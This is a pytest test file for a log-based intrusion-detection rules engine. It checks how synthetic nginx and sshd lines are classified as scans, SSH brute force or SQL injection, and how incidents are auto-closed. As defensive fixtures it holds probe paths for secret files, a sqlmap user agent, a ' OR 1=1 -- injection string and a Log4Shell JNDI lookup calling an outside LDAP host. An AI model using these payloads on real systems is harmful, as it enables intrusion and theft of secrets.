"""Rules for real public-server traffic: nginx access lines and sshd (synthetic lines, documentation IPs)."""

from app.netlogs import enrich, parse_http, parse_sshd
from app.rules import RulesEngine

T0 = 1_790_000_000.0


def nginx(n, ip, path, status, ua="Mozilla/5.0", method="GET", t=None):
    return {"event_id": f"n{n}", "source": "nginx_access", "layer": "web", "timestamp": None,
            "raw": f'{ip} - - [28/Sep/2026:14:00:{n % 60:02d} +0000] "{method} {path} HTTP/1.1" {status} 153 "-" "{ua}"'}


def sshd(n, msg, pid=4000):
    return {"event_id": f"s{n}", "source": "sshd", "layer": "os",
            "raw": f"Sep 28 14:00:{n % 60:02d} web-01 sshd[{pid}]: {msg}"}


def test_parse_combined_and_sshd_lines():
    h = parse_http(nginx(1, "198.51.100.7", "/.env", 404, ua="zgrab/0.x"))
    assert (h.method, h.path, h.status, h.src_ip, h.user_agent) == ("GET", "/.env", 404, "198.51.100.7", "zgrab/0.x")
    s = parse_sshd(sshd(1, "Invalid user oracle from 203.0.113.44 port 51234"))
    assert (s.event, s.user, s.src_ip, s.pid) == ("invalid_user", "oracle", "203.0.113.44", "4000")
    e = enrich(sshd(2, "Failed password for root from 203.0.113.9 port 22 ssh2"))
    assert e["src_ip"] == "203.0.113.9" and e["user"] == "root" and e["ssh_event"] == "failed_password"


def test_sensitive_path_probes_are_scans_and_404_is_never_exfiltration():
    r = RulesEngine()
    for i, path in enumerate(["/.env", "/.git/config", "/wp-config.php.bak", "/backup.sql", "/vendor/phpunit/src/Util/PHP/eval-stdin.php"]):
        assert r.check(nginx(i, "198.51.100.7", path, 404), T0 + i).category == "port_scan", path
    assert r.check(nginx(9, "198.51.100.8", "/export/members.csv", 404), T0).category == "benign"
    assert r.check(nginx(10, "198.51.100.8", "/admin/dump.php", 404), T0).category != "data_exfiltration"


def test_cms_paths_only_count_when_missing():
    r = RulesEngine()
    assert r.check(nginx(1, "198.51.100.9", "/wp-login.php", 404), T0).category == "port_scan"
    assert r.check(nginx(2, "192.0.2.10", "/wp-admin/", 200), T0).category == "benign"  # a real WordPress site


def test_harmless_404s_and_crawlers_do_not_make_a_scan():
    r = RulesEngine()
    for i in range(20):
        assert r.check(nginx(i, "192.0.2.20", f"/old-page-{i}", 404, ua="Mozilla/5.0 (compatible; Googlebot/2.1)"), T0 + i).category == "benign"
        assert r.check(nginx(100 + i, "192.0.2.21", "/favicon.ico", 404), T0 + i).category == "benign"


def test_404_burst_from_one_ip_is_a_scan():
    r = RulesEngine(scan_4xx_count=10, scan_window_s=120)
    cats = [r.check(nginx(i, "198.51.100.30", f"/random-{i}", 404), T0 + i).category for i in range(12)]
    assert cats[:9] == ["benign"] * 9 and cats[9:] == ["port_scan"] * 3
    hit = r.check(nginx(50, "198.51.100.30", "/random-x", 404), T0 + 20)
    assert len(hit.related_event_ids) == 13


def test_scanner_user_agents():
    r = RulesEngine()
    assert r.check(nginx(1, "198.51.100.40", "/", 200, ua="Mozilla/5.0 zgrab/0.x"), T0).category == "port_scan"
    assert r.check(nginx(2, "198.51.100.41", "/?id=1", 200, ua="sqlmap/1.8#stable"), T0).category == "sql_injection"
    assert r.check(nginx(3, "198.51.100.42", "/", 200, ua="Mozilla/5.0 (Windows NT 10.0)"), T0).category == "benign"


def test_ssh_brute_force_counts_guesses_not_lines():
    r = RulesEngine(ssh_count=5, ssh_window_s=600)
    out = []
    for i in range(5):  # one guess = 3 lines from the same sshd process
        pid = 5000 + i
        for msg in (f"Invalid user user{i} from 203.0.113.44 port {40000 + i}",
                    f"Failed password for invalid user user{i} from 203.0.113.44 port {40000 + i} ssh2",
                    f"Connection closed by invalid user user{i} 203.0.113.44 port {40000 + i} [preauth]"):
            out.append(r.check(sshd(len(out), msg, pid), T0 + 10 * i).category)
    assert out[:12] == ["benign"] * 12  # 4 guesses
    assert out[12:] == ["brute_force"] * 3  # the 5th guess


def test_ssh_several_passwords_in_one_connection_each_count():
    r = RulesEngine(ssh_count=5)
    cats = [r.check(sshd(i, "Failed password for root from 203.0.113.61 port 40104 ssh2", pid=812), T0 + i).category
            for i in range(5)]
    assert cats[-1] == "brute_force"


def test_key_only_server_preauth_closes_count():
    r = RulesEngine(ssh_count=5)
    cats = [r.check(sshd(i, f"Connection closed by authenticating user root 203.0.113.70 port {50000 + i} [preauth]",
                         pid=6000 + i), T0 + i).category for i in range(5)]
    assert cats == ["benign"] * 4 + ["brute_force"]


def test_successful_ssh_login_after_guessing_is_flagged():
    r = RulesEngine(ssh_count=5)
    for i in range(6):
        r.check(sshd(i, "Failed password for deploy from 203.0.113.80 port 40000 ssh2", pid=7000 + i), T0 + i)
    hit = r.check(sshd(9, "Accepted password for deploy from 203.0.113.80 port 40009 ssh2", pid=7009), T0 + 9)
    assert hit.category == "brute_force" and "SUCCEEDED" in hit.reason
    ok = r.check(sshd(10, "Accepted publickey for erick from 192.0.2.5 port 50000 ssh2", pid=7010), T0 + 10)
    assert ok.category == "benign"


def test_admin_typo_then_login_is_benign():
    r = RulesEngine(ssh_count=5)
    assert r.check(sshd(1, "Failed password for erick from 192.0.2.5 port 50000 ssh2", pid=8000), T0).category == "benign"
    assert r.check(sshd(2, "Accepted password for erick from 192.0.2.5 port 50000 ssh2", pid=8000), T0 + 5).category == "benign"


def test_ssh_brute_force_window_expires():
    r = RulesEngine(ssh_count=5, ssh_window_s=600)
    cats = [r.check(sshd(i, "Failed password for root from 203.0.113.90 port 1 ssh2", pid=9000 + i), T0 + 200 * i).category
            for i in range(8)]
    assert "brute_force" not in cats  # one guess every 200 s: never 5 inside 10 min


def _ssh_ev(n, ip="203.0.113.44"):
    return {"event_id": f"evt-rw-{n}", "host": "web-01", "layer": "os", "source": "sshd",
            "raw": f"Sep 28 14:00:{n % 60:02d} web-01 sshd[{1000 + n}]: Failed password for root from {ip} port {40000 + n} ssh2",
            "asset_criticality": 1.0}


def test_ingest_fills_src_ip_and_opens_one_incident_per_attacker(client):
    client.post("/events", json=[_ssh_ev(i) for i in range(6)])
    incs = [i for i in client.get("/incidents").json() if i["category"] == "brute_force"]
    assert len(incs) == 1 and incs[0]["src_ip"] == "203.0.113.44" and incs[0]["layer"] == "os"
    assert "lock account" not in incs[0]["recommended_action"]  # never lock root over SSH guessing


def test_quiet_scan_incident_is_auto_closed(client):
    core = client.core
    core.settings.auto_close_quiet_min = 60
    core.settings.threshold = 101  # keep Needle out of it
    client.post("/events", json=[_ssh_ev(i) for i in range(6)])
    inc = next(i for i in client.get("/incidents").json() if i["category"] == "brute_force")
    core.clock._offset += 59 * 60
    core.tick()
    assert client.get(f"/incidents/{inc['id']}").json()["status"] == "open"
    core.clock._offset += 2 * 60
    core.tick()
    closed = client.get(f"/incidents/{inc['id']}").json()
    assert closed["status"] == "resolved" and closed["resolved_by"] == "auto-close"
    assert closed["timeline"][-1]["kind"] == "auto_closed"
    assert any(r["type"] == "incident_auto_closed" for r in client.get("/audit").json()["records"])
    # The attacker comes back: a fresh incident, not the closed one.
    client.post("/events", json=[_ssh_ev(100 + i) for i in range(6)])
    open_ids = [i["id"] for i in client.get("/incidents").json() if i["status"] == "open" and i["category"] == "brute_force"]
    assert open_ids and inc["id"] not in open_ids


def test_auto_close_leaves_other_categories_alone(client):
    core = client.core
    core.settings.threshold = 101
    client.post("/events", json=[{"event_id": "evt-sqli", "host": "web-01", "layer": "web", "source": "flask_access",
                                  "src_ip": "198.51.100.50", "raw": "GET /search?q=' OR 1=1 -- 200"}])
    core.clock._offset += 3 * 3600
    core.tick()
    inc = next(i for i in client.get("/incidents").json() if i["category"] == "sql_injection")
    assert inc["status"] == "open"


def _parsed_ssh(n, ssh_event, ip, user=None, pid=None, **extra):
    """An event as the collector (CONTRACT.md "Parsed fields") sends a journald sshd message."""
    return {"event_id": f"p{n}", "source": "journald", "layer": "os", "src_ip": ip, "user": user,
            "raw": "message text is not needed when parsed is present",
            "parsed": {"format": "journald", "kind": "ssh", "program": "sshd", "pid": pid or 3000 + n,
                       "ssh_event": ssh_event, **extra}}


def test_collector_parsed_fields_are_used_first():
    r = RulesEngine(ssh_count=5)
    cats = [r.check(_parsed_ssh(i, "invalid_user", "203.0.113.99", f"u{i}", invalid_user=True), T0 + i).category
            for i in range(5)]
    assert cats == ["benign"] * 4 + ["brute_force"]
    # A rejected key before the right one is not a guess.
    r2 = RulesEngine(ssh_count=2)
    for i in range(3):
        hit = r2.check(_parsed_ssh(10 + i, "failed_auth", "192.0.2.5", "opsadmin", auth_method="publickey"), T0 + i)
        assert hit.category == "benign"
    web = {"event_id": "w1", "source": "nginx", "layer": "web", "src_ip": "198.51.100.7", "raw": "x",
           "parsed": {"format": "nginx_access", "kind": "http_request", "method": "GET", "path": "/", "status": 200,
                      "query": "x=${jndi:ldap://198.51.100.99/a}", "user_agent": "Mozilla/5.0", "malformed_request": False}}
    assert r.check(web, T0).category == "port_scan"
